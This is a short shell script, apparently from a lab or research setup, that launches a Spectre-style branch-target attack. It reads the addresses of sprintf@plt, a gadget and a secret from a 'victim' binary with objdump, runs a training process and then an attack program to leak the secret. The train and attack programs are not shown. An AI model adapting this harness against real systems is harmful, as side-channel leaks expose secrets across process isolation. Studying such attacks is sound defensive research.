#!/bin/sh

trap "kill -- -$$" SIGINT SIGTRAP EXIT
plt=$(objdump -d victim | grep -E "<sprintf@plt>:" | awk '{printf "0x" $1}')
gadget=$(objdump -d victim | grep -E "<gadget>:" | awk '{printf "0x" $1}')
secret=$(objdump -D victim | grep -E "<secret>:" | awk '{printf "0x" $1}')

echo "sprintf@plt:$plt\n"
echo "gadget:$gadget\n"
echo "secret:$secret\n"

./train victim $plt $gadget &      


./attack victim $secret 16 250


